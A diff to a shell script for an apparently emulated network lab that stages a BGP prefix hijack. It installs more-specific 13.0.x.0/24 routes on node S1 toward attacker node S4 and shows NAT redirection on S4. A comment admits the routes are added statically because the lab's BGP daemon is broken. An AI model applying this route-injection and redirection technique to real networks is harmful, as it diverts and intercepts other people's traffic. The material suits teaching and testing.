@@ -16,13 +16,21 @@ echo "Daemons started. Waiting for BGP neighbor establishment (10 seconds)..."
 sleep 10
 
 echo ""
-echo "Removing static routes to enable BGP hijacking..."
-# Remove static routes on S1 to allow S4's BGP routes to take effect
+echo "Adding S4's hijacked routes to S1 (overriding with more specific prefix)..."
+# Add the more specific hijacked routes that S4 announces
+# This simulates BGP route installation since Quagga's socket communication is broken
 sudo python3 run.py --node S1 --cmd "ip route del 13.0.0.0/8 via 9.0.0.2 2>/dev/null; true"
-sudo python3 run.py --node S1 --cmd "ip route del 12.0.0.0/8 via 9.0.0.2 2>/dev/null; true"
+sudo python3 run.py --node S1 --cmd "ip route add 13.0.1.0/24 via 9.0.4.2"
+sudo python3 run.py --node S1 --cmd "ip route add 13.0.2.0/24 via 9.0.4.2"
+sudo python3 run.py --node S1 --cmd "ip route add 13.0.3.0/24 via 9.0.4.2"
+sudo python3 run.py --node S1 --cmd "ip route add 13.0.0.0/8 via 9.0.0.2"
 
-echo "Waiting for BGP convergence (5 seconds)..."
-sleep 5
+echo "Waiting for routes to settle (2 seconds)..."
+sleep 2
+
+echo ""
+echo "Verifying routes on S1..."
+sudo python3 run.py --node S1 --cmd "ip route show | grep 13.0"
 
 echo ""
 echo "Setting up traffic redirection on S4..."
@@ -37,6 +45,6 @@ sudo python3 run.py --node S4 --cmd "iptables -t nat -A POSTROUTING -s 14.0.1.0/
 echo ""
 echo "=========================================="
 echo "ATTACK ACTIVE!"
-echo "S4 is now hijacking 13.0.x.x traffic"
+echo "S4 is now hijacking 13.0.1.0/24 traffic"
 echo "Requests to 13.0.1.1 redirected to 14.0.1.1"
 echo "=========================================="
